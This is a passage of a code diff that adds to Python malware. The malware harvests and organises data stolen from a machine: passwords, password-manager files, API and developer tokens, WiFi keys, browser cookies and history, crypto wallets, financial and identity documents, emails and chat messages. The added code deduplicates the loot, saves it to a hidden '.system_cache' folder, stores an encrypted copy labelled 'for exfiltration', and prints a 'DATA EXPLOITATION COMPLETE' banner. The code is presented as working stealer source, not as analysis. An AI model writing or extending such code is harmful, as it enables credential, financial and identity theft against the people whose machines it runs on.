+    for file_item in all_data.get('config_files', []):
+        file_path = file_item.get('path', '')
+        if file_path and file_path not in seen_file_paths:
+            seen_file_paths.add(file_path)
+            unified_files.append({
+                'path': file_path,
+                'category': 'config',
+                'size': file_item.get('size', 0),
+                'modified': file_item.get('modified'),
+                'hash': None,  # config_files don't have hash
+                'content_preview': file_item.get('content', '')[:500] if file_item.get('content') else None,
+                'relative_path': file_item.get('relative_path')
+            })
+    
+    normalized['unified_files'] = unified_files
+    
+    # 3. Unified Tokens: Merge application_tokens and development_tokens (deduplicate by value)
+    unified_tokens = []
+    seen_token_values = set()
+    
+    for token in all_data.get('application_tokens', []):
+        token_value = token.get('token', '') or token.get('value', '')
+        if token_value:
+            token_key = hashlib.md5(token_value.encode()).hexdigest()
+            if token_key not in seen_token_values:
+                seen_token_values.add(token_key)
+                unified_tokens.append({
+                    'type': 'application',
+                    'service': token.get('service', token.get('application', 'unknown')),
+                    'token': token_value[:100],  # Limit token length
+                    'location': token.get('file', token.get('path', 'unknown')),
+                    'source': 'application'
+                })
+    
+    for token in all_data.get('development_tokens', []):
+        token_value = token.get('token', '') or token.get('value', '')
+        if token_value:
+            token_key = hashlib.md5(token_value.encode()).hexdigest()
+            if token_key not in seen_token_values:
+                seen_token_values.add(token_key)
+                unified_tokens.append({
+                    'type': 'development',
+                    'service': token.get('service', token.get('tool', 'unknown')),
+                    'token': token_value[:100],
+                    'location': token.get('file', token.get('path', 'unknown')),
+                    'source': 'development'
+                })
+    
+    normalized['unified_tokens'] = unified_tokens
+    
+    # 4. WiFi Passwords: Deduplicate by SSID (already done in collect_wifi_passwords, but ensure)
+    wifi_passwords = []
+    seen_ssids = set()
+    for wifi in all_data.get('wifi_passwords', []):
+        ssid = wifi.get('ssid', '').lower()
+        if ssid and ssid not in seen_ssids:
+            seen_ssids.add(ssid)
+            wifi_passwords.append({
+                'ssid': wifi.get('ssid'),
+                'password': wifi.get('password'),
+                'method': wifi.get('method', 'unknown'),
+                'connection_name': wifi.get('connection_name'),
+                'source_file': wifi.get('source_file')
+            })
+    
+    normalized['wifi_passwords'] = wifi_passwords
+    
+    # 5. Browser Data: Keep as is (already structured)
+    normalized['browser_data'] = all_data.get('browser_data', {})
+    
+    # 6. Email Configs: Deduplicate by email/account
+    email_configs = []
+    seen_emails = set()
+    for email in all_data.get('email_configs', []):
+        email_key = email.get('email', '') or email.get('account', '')
+        if email_key:
+            email_lower = email_key.lower()
+            if email_lower not in seen_emails:
+                seen_emails.add(email_lower)
+                email_configs.append({
+                    'email': email_key,
+                    'client': email.get('client', email.get('application', 'unknown')),
+                    'config_file': email.get('file', email.get('path', 'unknown')),
+                    'server': email.get('server', email.get('imap_server', email.get('smtp_server', 'unknown')))
+                })
+    
+    normalized['email_configs'] = email_configs
+    
+    # 7. Databases: Deduplicate by path
+    databases = []
+    seen_db_paths = set()
+    for db in all_data.get('databases', []):
+        db_path = db.get('path', '')
+        if db_path and db_path not in seen_db_paths:
+            seen_db_paths.add(db_path)
+            databases.append({
+                'path': db_path,
+                'type': db.get('type', 'unknown'),
+                'size': db.get('size', 0),
+                'modified': db.get('modified'),
+                'hash': db.get('hash')
+            })
+    
+    normalized['databases'] = databases
+    
+    # 8. Cloud Storage Configs: Deduplicate by service and path
+    cloud_configs = []
+    seen_cloud_keys = set()
+    for cloud in all_data.get('cloud_storage_configs', []):
+        service = cloud.get('service', 'unknown')
+        path = cloud.get('path', cloud.get('file', ''))
+        key = f"{service}:{path}"
+        if key not in seen_cloud_keys:
+            seen_cloud_keys.add(key)
+            cloud_configs.append({
+                'service': service,
+                'path': path,
+                'config_file': path
+            })
+    
+    normalized['cloud_storage_configs'] = cloud_configs
+    
+    # 9. High-value data (keep as is, no deduplication needed)
+    normalized['crypto_wallets'] = all_data.get('crypto_wallets', [])
+    normalized['recent_documents'] = all_data.get('recent_documents', [])
+    normalized['system_info'] = all_data.get('system_info', {})
+    normalized['financial_data'] = all_data.get('financial_data', [])
+    normalized['identity_documents'] = all_data.get('identity_documents', [])
+    normalized['email_contacts_content'] = all_data.get('email_contacts_content', {})
+    normalized['chat_messages'] = all_data.get('chat_messages', [])
+    
+    # Statistics
+    normalized['statistics'] = {
+        'unified_credentials': len(unified_credentials),
+        'unified_files': len(unified_files),
+        'unified_tokens': len(unified_tokens),
+        'wifi_passwords': len(wifi_passwords),
+        'email_configs': len(email_configs),
+        'databases': len(databases),
+        'cloud_storage_configs': len(cloud_configs),
+        'browser_cookies': len(normalized['browser_data'].get('cookies', [])),
+        'browser_history': len(normalized['browser_data'].get('history', [])),
+        'crypto_wallets': len(normalized['crypto_wallets']),
+        'recent_documents': len(normalized['recent_documents']),
+        'financial_data': len(normalized['financial_data']),
+        'identity_documents': len(normalized['identity_documents']),
+        'email_contacts': len(normalized['email_contacts_content'].get('contacts', [])),
+        'email_messages': len(normalized['email_contacts_content'].get('content', [])),
+        'chat_messages': len(normalized['chat_messages']),
+    }
+    
+    return normalized
 
 def save_all_collected_data():
     """Collect and save ALL important data to .system_cache"""
@@ -1117,28 +1901,40 @@ def save_all_collected_data():
     all_data['password_manager_files'] = collect_password_manager_files()
     all_data['config_files'] = collect_all_config_files()
     
-    # Save to .system_cache
+    # High-value data collection
+    all_data['financial_data'] = collect_financial_data()
+    all_data['identity_documents'] = collect_identity_documents()
+    all_data['email_contacts_content'] = collect_email_contacts_and_content()
+    all_data['chat_messages'] = collect_chat_messages()
+    
+    # Normalize and deduplicate data
+    normalized_data = normalize_and_deduplicate_data(all_data)
+    
+    # Save to .system_cache - ONLY normalized_data.json (clean, deduplicated, accurate)
     try:
         os.makedirs(DATA_DIR, exist_ok=True)
         
-        # Save in CLEAR TEXT (primary file - readable)
-        data_file = f"{DATA_DIR}/comprehensive_data.json"
+        # Save normalized data (ONLY FILE - clean, deduplicated, ready to use)
+        data_file = f"{DATA_DIR}/normalized_data.json"
         with open(data_file, 'w', encoding='utf-8') as f:
-            json.dump(all_data, f, indent=2, default=str, ensure_ascii=False)
+            json.dump(normalized_data, f, indent=2, default=str, ensure_ascii=False)
         
         # Also save encrypted version (optional, for exfiltration)
         try:
-            encrypted_data = encrypt_data(json.dumps(all_data, default=str))
+            encrypted_data = encrypt_data(json.dumps(normalized_data, default=str))
             with open(ENCRYPTED_DATA_FILE, 'w', encoding='utf-8') as f:
                 f.write(encrypted_data)
         except:
             pass  # Encryption is optional
         
+        # Summary with both raw and normalized statistics
+        stats = normalized_data.get('statistics', {})
         summary = {
             'collection_time': all_data['timestamp'],
-            'total_items': {
+            'raw_data': {
                 'passwords': len(all_data['passwords']),
                 'sensitive_files': len(all_data['sensitive_files']),
+                'config_files': len(all_data.get('config_files', [])),
                 'browser_cookies': len(all_data['browser_data']['cookies']),
                 'browser_history': len(all_data['browser_data']['history']),
                 'wifi_configs': len(all_data['wifi_passwords']),
@@ -1150,7 +1946,12 @@ def save_all_collected_data():
                 'cloud_storage_configs': len(all_data.get('cloud_storage_configs', [])),
                 'development_tokens': len(all_data.get('development_tokens', [])),
                 'password_manager_files': len(all_data.get('password_manager_files', [])),
-                'config_files': len(all_data.get('config_files', [])),
+            },
+            'normalized_data': stats,
+            'deduplication': {
+                'credentials_merged': len(all_data['passwords']) + len(all_data.get('password_manager_files', [])) - stats.get('unified_credentials', 0),
+                'files_merged': len(all_data['sensitive_files']) + len(all_data.get('config_files', [])) - stats.get('unified_files', 0),
+                'tokens_merged': len(all_data.get('application_tokens', [])) + len(all_data.get('development_tokens', [])) - stats.get('unified_tokens', 0),
             }
         }
         
@@ -1159,28 +1960,40 @@ def save_all_collected_data():
             json.dump(summary, f, indent=2)
         
         log_activity("DATA_COLLECTION", f"Data collection complete. Saved to {DATA_DIR}/")
+        log_activity("DATA_COLLECTION", f"Data saved: {data_file}")
         log_activity("DATA_COLLECTION", f"Summary: {json.dumps(summary, default=str)}")
         
         # Print summary to console (clear text)
-        print("\n" + "="*60)
-        print("DATA EXPLOITATION COMPLETE - CLEAR TEXT")
-        print("="*60)
-        print(f"Passwords: {len(all_data['passwords'])}")
-        print(f"Sensitive Files: {len(all_data['sensitive_files'])}")
-        print(f"Browser Cookies: {len(all_data['browser_data']['cookies'])}")
-        print(f"Browser History: {len(all_data['browser_data']['history'])}")
-        print(f"WiFi Passwords: {len(all_data['wifi_passwords'])}")
-        print(f"Email Configs: {len(all_data['email_configs'])}")
-        print(f"Databases: {len(all_data['databases'])}")
-        print(f"Crypto Wallets: {len(all_data['crypto_wallets'])}")
-        print(f"Recent Documents: {len(all_data['recent_documents'])}")
-        print(f"Application Tokens: {len(all_data.get('application_tokens', []))}")
-        print(f"Cloud Storage Configs: {len(all_data.get('cloud_storage_configs', []))}")
-        print(f"Development Tokens: {len(all_data.get('development_tokens', []))}")
-        print(f"Password Manager Files: {len(all_data.get('password_manager_files', []))}")
-        print(f"Config Files (~/.config/): {len(all_data.get('config_files', []))}")
-        print(f"\nAll data saved in CLEAR TEXT: {data_file}")
-        print("="*60 + "\n")
+        print("\n" + "="*70)
+        print("DATA EXPLOITATION COMPLETE - NORMALIZED & DEDUPLICATED")
+        print("="*70)
+        print("\n📊 NORMALIZED DATA (Deduplicated & Merged):")
+        print(f"  🔐 Unified Credentials: {stats.get('unified_credentials', 0)} (merged from passwords + password managers)")
+        print(f"  📁 Unified Files: {stats.get('unified_files', 0)} (merged from sensitive + config files)")
+        print(f"  🔑 Unified Tokens: {stats.get('unified_tokens', 0)} (merged from application + development tokens)")
+        print(f"  📶 WiFi Passwords: {stats.get('wifi_passwords', 0)}")
+        print(f"  📧 Email Configs: {stats.get('email_configs', 0)}")
+        print(f"  💾 Databases: {stats.get('databases', 0)}")
+        print(f"  ☁️  Cloud Storage: {stats.get('cloud_storage_configs', 0)}")
+        print(f"  🍪 Browser Cookies: {stats.get('browser_cookies', 0)}")
+        print(f"  📜 Browser History: {stats.get('browser_history', 0)}")
+        print(f"  💰 Crypto Wallets: {stats.get('crypto_wallets', 0)}")
+        print(f"  📄 Recent Documents: {stats.get('recent_documents', 0)}")
+        print(f"  💳 Financial Data: {stats.get('financial_data', 0)}")
+        print(f"  🆔 Identity Documents: {stats.get('identity_documents', 0)}")
+        print(f"  📧 Email Contacts: {stats.get('email_contacts', 0)}")
+        print(f"  📨 Email Messages: {stats.get('email_messages', 0)}")
+        print(f"  💬 Chat Messages: {stats.get('chat_messages', 0)}")
+        
+        print("\n📈 DEDUPLICATION STATS:")
+        dedup = summary['deduplication']
+        print(f"  Credentials: Removed {dedup['credentials_merged']} duplicates")
+        print(f"  Files: Removed {dedup['files_merged']} duplicates")
+        print(f"  Tokens: Removed {dedup['tokens_merged']} duplicates")
+        
+        print(f"\n💾 File saved:")
+        print(f"  Data: {data_file} (normalized, deduplicated, accurate)")
+        print("="*70 + "\n")
         
         return all_data
     except Exception as e:
